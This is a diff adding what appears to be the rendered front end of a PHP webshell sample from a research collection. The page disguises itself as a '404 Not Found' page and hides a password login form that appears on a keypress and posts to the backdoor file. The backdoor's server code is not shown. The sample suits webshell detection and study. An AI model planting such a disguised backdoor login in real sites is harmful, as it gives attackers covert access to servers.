@@ -1,0 +1,90 @@
+//
+Warning: session_start(): Cannot send session cookie - headers already sent by (output started at C:\Users\yaoleo\Desktop\webshellSample-master\webshellSample-master\PHP\dama\d9f5253d5f5a076ca02045e97895933e.php:1) in C:\Users\yaoleo\Desktop\webshellSample-master\webshellSample-master\PHP\dama\d9f5253d5f5a076ca02045e97895933e.php on line 70
+
+Warning: session_start(): Cannot send session cache limiter - headers already sent (output started at C:\Users\yaoleo\Desktop\webshellSample-master\webshellSample-master\PHP\dama\d9f5253d5f5a076ca02045e97895933e.php:1) in C:\Users\yaoleo\Desktop\webshellSample-master\webshellSample-master\PHP\dama\d9f5253d5f5a076ca02045e97895933e.php on line 70
+   <!DOCTYPE HTML>
+<head>
+	<meta http-equiv="content-type" content="text/html" />
+	<meta name="author" content="Steve Smith" />
+    <meta http-equiv="content-type" charset="UTF-8" />
+	<title>404 Not Found</title>
+    <style>
+    input{font:11px Verdana;BACKGROUND:#FFFFFF;height:18px;border:1px solid #666666;}
+    #login{display:none;}
+    </style>
+</head>
+<body>
+   <div id="notice" style="position:fixed;right:0;border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#ffffaa;padding:5px 15px 5px 5px;display: none; font-size:12px;"></div>
+   <div id="login">
+   <form action="" method="POST">
+   <span style="font:11px Verdana;">
+       Password: 
+     </span>
+     <input id="pwd" name="pwd" type="password" size="20" />
+     <input id="submit" type="button" value="login" />
+   </form>
+  </div>
+<script>
+function $(d) {
+	return document.getElementById(d)
+}
+function sideOut(t) {
+    if(t==null) t=1500;
+	window.setTimeout(display, t);
+	function display() {
+		$("notice").style.display = "none"
+	}
+}
+$("submit").onclick = function() {
+		var pwd = $("pwd").value;
+		var options = {};
+		options.url = 'd9f5253d5f5a076ca02045e97895933e.php';
+		options.listener = callback;
+		options.method = 'POST';
+		var request = XmlRequest(options);
+		request.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+		if (pwd) request.send('pwd=' + pwd);
+        else{
+            $("notice").style['display']='block';
+            $("notice").innerHTML='DATA-ERROR';
+            sideOut();
+        }
+	}
+function XmlRequest(options) {
+	var req = false;
+	if (window.XMLHttpRequest) {
+		var req = new XMLHttpRequest()
+	} else if (window.ActiveXObject) {
+		var req = new window.ActiveXObject('Microsoft.XMLHTTP')
+	}
+	if (!req) return false;
+	req.onreadystatechange = function() {
+		if (req.readyState == 4 && req.status == 200) {
+			options.listener.call(req)
+		}
+	};
+	req.open(options.method, options.url, true);
+	return req
+}
+function callback() {
+	var json = eval("(" + this.responseText + ")");
+    if (json.status=='on'){
+        window.location.reload();
+        return;
+    }
+	if (json.notice) {
+		$("notice").style.display = "block";
+		$("notice").innerHTML = json.notice;
+        sideOut();
+	}
+}
+document.onkeydown = function(e) {
+		    var theEvent = window.event || e;      
+            var code = theEvent.keyCode || theEvent.which; 
+			if (80 == code) {
+				$("login").style.display = "block"
+			}
+		}
+</script>
+</body>
+</html>
